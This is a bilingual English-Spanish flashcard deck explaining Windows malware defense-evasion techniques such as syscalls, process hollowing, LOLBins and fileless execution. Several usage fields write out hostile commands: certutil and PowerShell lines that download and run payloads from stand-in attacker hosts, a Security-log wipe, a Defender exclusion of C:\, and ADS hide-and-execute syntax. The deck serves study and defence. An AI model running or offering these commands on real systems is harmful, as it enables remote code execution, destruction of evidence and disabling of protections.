text: Attackers bypass EDR API hooking in user mode by performing {{c1::direct system calls}} (Syscalls) to transition to kernel mode directly, bypassing NTDLL.
explanation: Endpoint Detection and Response (EDR) systems hook standard Windows API functions in user-mode `ntdll.dll` to monitor process behavior. By loading the raw assembly instructions for syscalls directly, malware can transition to kernel mode without executing hooked functions.
usage: Tools like Syswhispers are used to generate custom assembly headers and dynamic syscall stubs for evasion.
spanish: Los atacantes evaden los ganchos de la API de EDR en modo de usuario realizando llamadas directas al sistema (Syscalls) para pasar al modo de núcleo directamente, evadiendo NTDLL.

text: To execute covert code in a benign context, malware launches a system process in a suspended state, unmaps its memory, and writes a replacement payload; this is known as {{c1::Process Hollowing}}.
explanation: Process hollowing evasion unmaps the original executable from a legitimate suspended process's memory space (e.g. svchost.exe) using NtUnmapViewOfSection, and injects a malicious payload into the hollowed section, updating the Thread Entry Point.
usage:
**Symptom**: Unusually high CPU or network activity from a standard system process like svchost.exe.
**Root Cause**: Malicious payload executing inside a hollowed-out legitimate process container.
**Validation**: Run Sysinternals Process Hacker / Process Explorer and inspect the memory sections or parent-child hierarchy.
**Remediation**: Use EDR memory scanning for hollowed processes (detecting mismatch between file-on-disk and memory section headers).
spanish: Para ejecutar código encubierto en un contexto benigno, el malware inicia un proceso del sistema en estado suspendido, desasigna su memoria y escribe una carga útil de reemplazo; esto se conoce como vaciado de procesos (Process Hollowing).

text: To evade parent-child process detection rules, malware spoofs its parent process by using the {{c1::UpdateProcThreadAttribute}} API to specify a different Parent PID.
explanation: EDR and security agents monitor parent-child process relationships (e.g., cmd.exe spawned by word.exe is suspicious). Parent PID Spoofing leverages Windows thread execution attributes to assign a benign parent (like explorer.exe) to a newly created malicious process.
usage:
Example PowerShell/CLI attack pattern:
  • Malware calls InitializeProcThreadAttributeList
  • Updates attribute with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
  • Creates process pointing to benign PPID
spanish: Para evadir las reglas de detección de procesos padre-hijo, el malware suplanta su proceso padre utilizando la API UpdateProcThreadAttribute para especificar un PID padre diferente.

text: In security frameworks (like MITRE ATT&CK), the tactic used by adversaries to avoid detection by security controls, antivirus software, and logging systems during an intrusion is {{c1::Defense Evasion}}.
explanation: Defense evasion covers dozens of techniques, including code obfuscation, process injection, clearing logs, and bypassing UAC.
usage: Tactic ID: TA0005 (MITRE ATT&CK Defense Evasion)
spanish: La táctica utilizada por los adversarios para evitar ser detectados por el software de seguridad y los sistemas de registro durante una intrusión se llama Defense Evasion.

text: The process of modifying code structure (e.g., via renaming variables, base64 encoding, or XOR encryption) to hide its actual logic without changing its execution result is {{c1::Obfuscation}}.
explanation: Helps malware bypass static signature-based antivirus scanners, since the file signature is altered.
usage: Techniques: XOR encoding, Base64 wrapping, string splitting
spanish: El proceso de modificar la estructura del código para ocultar su lógica real sin cambiar el resultado de su ejecución se denomina ofuscación (Obfuscation).

text: Adversaries who execute malicious code using legitimate, pre-installed administrative operating system utilities (like PowerShell or certutil) are performing a technique called {{c1::Living off the Land}} (LotL).
explanation: Since administrative tools are trusted, their execution is less likely to trigger security alerts. Legitimate binaries used this way are called LOLBins.
usage: LOLBin example: certutil.exe -urlcache -f -split http://malware.com/payload.exe
spanish: Los atacantes que ejecutan código malicioso utilizando utilidades administrativas legítimas preinstaladas en el sistema realizan la técnica Living off the Land.

text: The technique where malware injects its own malicious code into the memory space of a running, legitimate system process (like svchost.exe or explorer.exe) is called {{c1::Process Injection}}.
explanation: Process injection hides the malware under a trusted process, bypassing process-based endpoint monitoring.
usage: Common API sequence: OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread
spanish: La técnica en la que el malware inyecta su código malicioso en el espacio de memoria de un proceso legítimo en ejecución se llama inyección de procesos (Process Injection).

text: The execution technique where an attacker places a malicious DLL with a name identical to a required system library in a directory searched before the system folder is called {{c1::DLL Hijacking}} (or DLL Side-Loading).
explanation: Applications often search for DLL dependencies in their current directory first. Placing the fake DLL there causes the application to run it automatically.
usage: Attack vector: Abusing DLL search order path
spanish: La técnica donde un atacante coloca una DLL maliciosa con el mismo nombre que una biblioteca legítima en la ruta de búsqueda de la aplicación se llama DLL Hijacking.

text: After executing malicious commands on a Windows machine, attackers often execute commands to {{c1::clear event logs}} (e.g. using `wevtutil`) to remove audit trails.
explanation: Clearing logs makes incident response and forensic investigation much more difficult, though the act of clearing logs itself is highly suspicious.
usage: PowerShell command: wevtutil cl Security (clears the Security log)
spanish: Después de realizar acciones maliciosas, los atacantes suelen borrar los registros de eventos (Event Logs) de Windows para eliminar huellas de auditoría.

text: To stop local monitoring, attackers try to disable or modify local host firewalls and antivirus protections, a technique known as {{c1::Impairing Defenses}}.
explanation: Includes terminating endpoint detection and response (EDR) agents or adding exclusions to Windows Defender.
usage: Defender exclusion command: Add-MpPreference -ExclusionPath "C:\"
spanish: Para detener el monitoreo, los atacantes intentan desactivar o dañar las defensas locales, técnica conocida como Impairing Defenses.

text: The process of exploiting system flaws or configurations to bypass Windows User Account Control prompts and run programs with elevated administrative privileges is {{c1::UAC Bypass}}.
explanation: Allows programs to run silently as administrator without triggering the visual dialog pop-up that alerts users.
usage: Techniques: Fodhelper registry abuse, eventvwr bypass
spanish: El proceso de eludir las solicitudes de Control de Cuentas de Usuario (UAC) de Windows para ejecutar comandos como administrador se llama UAC Bypass.

text: In Windows NTFS filesystems, attackers can hide malicious payloads inside legitimate files without modifying the file size or behavior by using {{c1::Alternate Data Streams}} (ADS).
explanation: ADS allows files to have multiple streams of data. Standard tools like Dir show only the default stream, hiding the second malicious stream.
usage: Write syntax: type payload.exe > calc.exe:secret.exe | Execute: wmic process call create c:\calc.exe:secret.exe
spanish: En Windows NTFS, los atacantes pueden ocultar archivos maliciosos dentro de archivos legítimos utilizando flujos de datos alternativos (Alternate Data Streams).

text: A type of stealth malware that alters operating system files or modifies kernel memory to hide processes, files, and network connections from standard diagnostic tools is a {{c1::Rootkit}}.
explanation: Rootkits operate at a low level (often ring 0 / kernel mode), intercepting system calls and filtering out the malware's own presence.
usage: Level: Kernel-mode rootkits, User-mode rootkits
spanish: Un tipo de malware sigiloso que altera archivos del sistema o memoria del kernel para ocultar procesos y conexiones se llama Rootkit.

text: The practice of concealing malicious data, scripts, or payloads within standard, benign-looking files (like hiding a ZIP file inside a PNG image) is called {{c1::Steganography}}.
explanation: Allows attackers to bypass network traffic filters that scan for binary files, since the transfer looks like a regular image download.
usage: Utility: Steghide
spanish: La práctica de ocultar datos o scripts maliciosos dentro de archivos que parecen normales y benignos se llama esteganografía (Steganography).

text: The technique where attackers modify the creation, modification, and access timestamps of a malicious file to match legitimate system files is called {{c1::Timestomping}}.
explanation: Evades timeline analysis performed by digital forensics specialists looking for recently created files in system directories.
usage: Forensic defense: Timestomping bypasses basic MACE timestamp analysis.
spanish: La técnica en la que los atacantes modifican las marcas de tiempo (creación, modificación) de un archivo malicioso para imitar a los del sistema se llama Timestomping.

text: To hide the destination of command-and-control traffic, attackers use {{c1::Domain Fronting}}, which routes traffic through a major CDN host header, making it look like it's going to a trusted site (e.g. Gmail).
explanation: The HTTP connection request points to a trusted CDN domain, but the internal HTTP 'Host' header points to the attacker's server.
usage: Mechanism: CDNs route based on the HTTP Host header, bypassing IP filters.
spanish: Para ocultar el destino del tráfico malicioso, los atacantes utilizan Domain Fronting, enrutando el tráfico a través del encabezado de host de un CDN confiable.

text: To bypass security systems that flag files based on known blacklisted hashes, attackers change the hash of their malware without breaking functionality by adding dummy bytes, a technique called {{c1::Padding}}.
explanation: Adding arbitrary empty bytes changes the MD5/SHA256 checksum of the file entirely, defeating static signature detection.
usage: Action: Appending zeros or garbage bytes to the end of a payload.
spanish: Para eludir los bloqueos de firmas de hash conocidas, los atacantes agregan bytes de relleno (Padding) al final del archivo para alterar su firma digital.

text: Malware can detect if it is running inside an analysis sandbox by testing for user interaction (like mouse clicks) or delaying execution using sleep loops, techniques known as {{c1::Sandbox Evasion}}.
explanation: Sandboxes run files for a short duration. Sleep loops run out the sandbox's timer before executing malicious behaviors.
usage: Technique: Delaying execution, checking for virtualization keys in the registry.
spanish: El malware puede detectar si está en un entorno de pruebas (sandbox) mediante retrasos de tiempo o buscando firmas de máquinas virtuales (Sandbox Evasion).

text: To prevent writing files to the local hard drive (which can be scanned easily by antivirus), attackers load scripts directly in memory. This is called {{c1::Fileless Malware}} (or memory-only execution).
explanation: Often leverages command execution via PowerShell or WMI, loading DLLs directly from network locations into memory.
usage: Example: iex (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
spanish: Para evitar escribir archivos en el disco local que puedan ser escaneados por antivirus, los atacantes cargan scripts en memoria, conocido como Fileless Malware.

text: To bypass process audits that monitor command-line arguments, malware performs {{c1::Process Argument Spoofing}} by writing fake arguments to the Process Environment Block (PEB) during process creation.
explanation: This technique makes command-line scanners believe a benign command is running, while the actual process runs with different (malicious) arguments in memory.
usage: Mechanism: Create process in suspended state -> modify PEB -> resume execution.
spanish: Para eludir auditorías que monitorean argumentos de línea de comandos, el malware realiza Process Argument Spoofing modificando el bloque de entorno de proceso (PEB).
